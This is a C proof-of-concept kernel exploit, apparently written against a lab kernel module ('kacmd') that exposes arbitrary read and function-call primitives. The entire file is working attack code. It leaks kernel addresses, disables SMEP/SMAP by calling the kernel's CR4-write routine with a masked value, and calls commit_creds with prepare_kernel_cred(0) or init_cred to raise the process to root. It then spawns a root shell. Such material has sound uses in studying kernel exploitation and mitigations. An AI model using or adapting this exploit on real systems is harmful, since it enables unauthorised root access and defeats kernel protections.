/* POC to exploit arbitrary read and
 * a kernel fptr overwrite, with call to user code
 * to gain local priv esc with disable SMAP/SMEP.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/types.h>


#include <kacmd.h>
#include <exp_commons.h>

#define KERNEL_CREDS 0xab7a0
#define COMMIT_CREDS 0xab3f0

#define INIT_CRED 0x579c0

//disable smep/smap
#define CR4_VALUE 0x6f0
#define WRITE_CR4 0x677d0

#define CR4_MASK 0xfffffbffffffffff

unsigned long KERNEL_BASE;

// copied from https://github.com/xairy/kernel-exploits/blob/master/CVE-2017-7308/poc.c
typedef unsigned long __attribute__((regparm(3))) (* _commit_creds)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (* _prepare_kernel_cred)(unsigned long cred);

void get_root_payload(void) {
	((_commit_creds)(KERNEL_BASE + COMMIT_CREDS))(
		((_prepare_kernel_cred)(KERNEL_BASE + KERNEL_CREDS))(0)
	);
}

void spawn_shell(void){
    system("/bin/sh");

    fini();
    exit(0);
}

int main(int argc, char** argv){
    struct kacmd_info_params kip;
    struct kacmd_info_resp kir;
	struct kacmd_call_params kcp;
    
    init();

    kip.cmd = KACMD_INFO;
    write_dev(cmd, (char*)&kip, sizeof(kip), 0);
    read_dev(cmd, (char*)&kir, sizeof(kir), 0);
    printf("[I] Vpg: %p Ppg: %p Epg: %p\n", kir.pg_vaddress, kir.pg_paddress, kir.exec_paddress);
    printf("[I] code: %p data: %p bss: %p\n", kir.kernel_code, kir.kernel_data, kir.kernel_bss);
    printf("[I] cr4: %lx masked: %lx\n", kir.cr4, kir.cr4 & CR4_MASK);
    
    if (argc > 1)
    {
        kcp.cmd = KACMD_CALL_COMPLEX;
        kcp.address = (void (*)())(kir.kernel_code + WRITE_CR4);
        kcp.rdi = kir.cr4 & CR4_MASK;
        
        write_dev(cmd, (char*)&kcp, sizeof(kcp), 0);

        KERNEL_BASE = kir.kernel_code;
        kcp.cmd = KACMD_CALL_SIMPLE;
        kcp.address = &get_root_payload;
        
        write_dev(cmd, (char*)&kcp, sizeof(kcp), 0);
    }
    else
    {
        kcp.cmd = KACMD_CALL_COMPLEX;
        kcp.address = (void (*)())(kir.kernel_code + COMMIT_CREDS);
        kcp.rdi = kir.kernel_data + INIT_CRED;
        
        write_dev(cmd, (char*)&kcp, sizeof(kcp), 0);
    }
 	spawn_shell();   
}
